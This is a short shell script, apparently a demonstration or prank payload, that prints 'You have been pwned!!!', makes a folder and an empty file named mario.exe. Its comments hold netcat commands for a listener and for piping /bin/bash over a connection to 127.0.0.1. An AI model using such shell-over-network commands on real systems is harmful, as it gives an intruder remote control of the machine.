echo "You have been pwned!!!"

mkdir pwnedFolder
cd pwnedFolder
touch mario.exe


#nc –lvp 8009 to listen
#nc 127.0.0.1 8009 -e /bin/bash